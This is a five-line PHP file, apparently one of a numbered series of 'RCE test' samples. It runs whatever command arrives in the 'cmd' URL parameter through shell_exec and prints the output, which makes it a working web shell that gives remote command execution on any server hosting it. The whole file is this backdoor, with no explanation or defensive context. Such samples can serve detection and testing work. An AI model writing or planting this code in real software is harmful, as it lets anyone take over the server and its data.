<?php
// RCE test variation #157
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>